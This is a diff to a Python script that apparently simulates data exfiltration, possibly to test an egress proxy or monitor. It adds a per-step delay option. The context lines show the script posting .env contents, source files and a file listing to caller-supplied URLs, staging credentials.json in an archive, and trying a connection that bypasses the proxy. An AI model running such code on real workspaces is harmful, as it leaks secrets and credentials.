@@ -37,10 +37,12 @@ def main() -> None:
     ap.add_argument("--pinned-ca")
     ap.add_argument("--direct", help="host:port reached without the proxy")
     ap.add_argument("--cache-dir", help="where to stage a workspace snapshot")
+    ap.add_argument("--pace", type=float, default=0.0, help="seconds to wait before each step")
     a = ap.parse_args()
     cwd = Path.cwd()
     blob = os.urandom(300 * 1024)
 
+    time.sleep(a.pace)
     if a.api:
         listing = [str(p.relative_to(cwd)) for p in cwd.rglob("*") if ".git" not in p.parts]
         body = gzip.compress(json.dumps({"file": (cwd / "src/app.py").read_text(),
@@ -48,10 +50,12 @@ def main() -> None:
         post(a.api, body, {"Content-Type": "application/json", "Content-Encoding": "gzip"},
              ssl.create_default_context())
 
+    time.sleep(a.pace)
     if a.telemetry:
         post(a.telemetry, json.dumps({"env": (cwd / ".env").read_text()}).encode(),
              {"Content-Type": "application/json"})
 
+    time.sleep(a.pace)
     # A workspace snapshot staged on disk, then uploaded "encrypted" (random bytes).
     if a.cache_dir:
         cache = Path(a.cache_dir)
@@ -61,15 +65,18 @@ def main() -> None:
             tf.add(cwd / "config/credentials.json", arcname="workspace/config/credentials.json")
         (cache / "snapshot.tar.gz").write_bytes(buf.getvalue())
         (cache / "upload.bin").write_bytes(blob)
+    time.sleep(a.pace)
     if a.upload:
         post(a.upload, blob, {"Content-Type": "application/octet-stream"}, ssl.create_default_context())
 
+    time.sleep(a.pace)
     if a.pinned:
         try:
             post(a.pinned, b"pinned", context=ssl.create_default_context(cafile=a.pinned_ca))
         except Exception:
             pass
 
+    time.sleep(a.pace)
     if a.direct:
         host, port = a.direct.rsplit(":", 1)
         with socket.create_connection((host, int(port))):
